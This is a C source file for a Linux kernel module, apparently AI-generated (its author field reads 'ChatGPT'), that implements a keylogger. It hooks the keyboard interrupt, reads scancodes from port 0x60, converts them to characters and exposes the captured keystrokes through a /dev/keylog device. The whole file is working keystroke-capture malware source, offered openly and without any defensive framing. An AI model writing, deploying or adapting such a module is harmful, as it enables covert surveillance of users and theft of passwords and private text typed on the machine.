#include <linux/module.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/interrupt.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/io.h>
#include <linux/spinlock.h>

#define DEVICE_NAME "keylog"
#define BUF_SIZE 128
#define IRQ_KEYBOARD 1

static char buffer[BUF_SIZE];
static int buf_index = 0;
static DEFINE_SPINLOCK(buf_lock);

static dev_t dev_num;
static struct cdev key_cdev;
static struct class *key_class;

static const char scancode_map[128] = {
    [0x1E] = 'a', [0x30] = 'b', [0x2E] = 'c', [0x20] = 'd',
    [0x12] = 'e', [0x21] = 'f', [0x22] = 'g', [0x23] = 'h',
    [0x17] = 'i', [0x24] = 'j', [0x25] = 'k', [0x26] = 'l',
    [0x32] = 'm', [0x31] = 'n', [0x18] = 'o', [0x19] = 'p',
    [0x10] = 'q', [0x13] = 'r', [0x1F] = 's', [0x14] = 't',
    [0x16] = 'u', [0x2F] = 'v', [0x11] = 'w', [0x2D] = 'x',
    [0x15] = 'y', [0x2C] = 'z', [0x0B] = '0', [0x02] = '1',
    [0x03] = '2', [0x04] = '3', [0x05] = '4', [0x06] = '5',
    [0x07] = '6', [0x08] = '7', [0x09] = '8', [0x0A] = '9',
    [0x39] = ' ', [0x1C] = '\n'
};

// --- TOP HALF ---
static irqreturn_t irq_handler(int irq, void *dev_id)
{
    return IRQ_WAKE_THREAD;  // Wake up threaded handler
}

// --- BOTTOM HALF / THREAD ---
static irqreturn_t irq_thread_fn(int irq, void *dev_id)
{
    unsigned char scancode = inb(0x60);
    if (scancode & 0x80) return IRQ_HANDLED; // Key release

    char ch = scancode_map[scancode];
    if (ch) {
        spin_lock(&buf_lock);
        if (buf_index < BUF_SIZE - 1) {
            buffer[buf_index++] = ch;
            if (ch == '\n')
                buffer[buf_index] = '\0';  // null-terminate
        }
        spin_unlock(&buf_lock);
    }

    return IRQ_HANDLED;
}

static ssize_t keylog_read(struct file *file, char __user *user_buf, size_t len, loff_t *offset)
{
    ssize_t copied;

    spin_lock(&buf_lock);
    buffer[buf_index] = '\0';
    copied = simple_read_from_buffer(user_buf, len, offset, buffer, buf_index);
    buf_index = 0;
    spin_unlock(&buf_lock);

    return copied;
}

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = keylog_read,
};

static int __init keylog_init(void)
{
    int ret;

    ret = request_threaded_irq(IRQ_KEYBOARD,
                               irq_handler,
                               irq_thread_fn,
                               IRQF_SHARED,
                               DEVICE_NAME,
                               (void *)irq_handler);

    if (ret) {
        pr_err("Failed to request threaded IRQ\n");
        return -1;
    }

    if (alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME) < 0) {
        free_irq(IRQ_KEYBOARD, (void *)irq_handler);
        return -1;
    }

    cdev_init(&key_cdev, &fops);
    if (cdev_add(&key_cdev, dev_num, 1) < 0) {
        unregister_chrdev_region(dev_num, 1);
        free_irq(IRQ_KEYBOARD, (void *)irq_handler);
        return -1;
    }

    key_class = class_create(THIS_MODULE, DEVICE_NAME);
    device_create(key_class, NULL, dev_num, NULL, DEVICE_NAME);

    pr_info("Threaded keylogger loaded. Device: /dev/keylog\n");
    return 0;
}

static void __exit keylog_exit(void)
{
    device_destroy(key_class, dev_num);
    class_destroy(key_class);
    cdev_del(&key_cdev);
    unregister_chrdev_region(dev_num, 1);
    free_irq(IRQ_KEYBOARD, (void *)irq_handler);
    pr_info("Threaded keylogger unloaded.\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ChatGPT");
MODULE_DESCRIPTION("Threaded IRQ keyboard logger exposing /dev/keylog");

module_init(keylog_init);
module_exit(keylog_exit);

